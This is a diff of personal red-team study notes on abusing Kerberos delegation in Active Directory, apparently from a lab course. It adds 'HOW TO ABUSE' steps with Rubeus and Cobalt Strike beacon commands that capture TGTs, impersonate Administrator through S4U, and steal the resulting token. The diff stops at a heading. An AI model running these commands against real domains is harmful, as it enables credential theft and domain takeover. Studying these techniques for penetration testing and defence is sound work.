@@ -35,9 +35,10 @@ three types: unconstrained, constrained, role-based
         enabled by setting a flag called TRUSTED_FOR_DELEGATION on the UAC attribute of the computer object
             we can check which copmuters have unconstrained using: 
                 beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
-        this can be abused since any copmuter configured for unconstrained delegation can be used to extract TGTs
-        we can use rubeus' monitor command to capture and display TGTs as user authneticate
-            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
+        HOW TO ABUSE:
+            this can be abused since any copmuter configured for unconstrained delegation can be used to extract TGTs
+            we can use rubeus' monitor command to capture and display TGTs as user authneticate
+                beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
     constrained delegation:
         Service for User (S4U) extension was created to replace unconstrained by limiting the services to which another service can delegate access
             Service for User to Proxy (S4U2proxy) allows a service to obtain a specified service ticket on behalf of a different user
@@ -57,3 +58,19 @@ three types: unconstrained, constrained, role-based
                     beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
                     NOTE: any value other than default 4096 should be inspected, decimal value for TRUSTED_TO_AUTH_FOR_DELEGATION is 16777216, so we would do [System.Convert]::ToBoolean(<UAC_value> -band 16777216) in PowerShell
             the service will send a TGS-REQ containing the user's username and sets the SPN to the copmuter's own samAccountName    
+        HOW TO ABUSE:
+            if protocol transition is enabled:
+                we can obtain a TGS for any user in the domain using S4U2self
+                    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
+                        where...
+                            /user is the computer configured for delegation
+                            /msdsspn is the service the principal is allowed to delegate to
+                            /ticket is the TGT for the principal
+                            /impersonateuser is the user we want to impersonate
+                once we obtain the ticket, we can inspect and verify the username is that of who we impersonated
+                    PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIF8[...snip...]MtMSQ=
+                rubeus will take the ticket and submit an S4U2proxy request for the service we specified
+                now we can interact with the service:
+                    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]ZzLTE=
+                    beacon> steal_token 3380
+            without protocol transition:
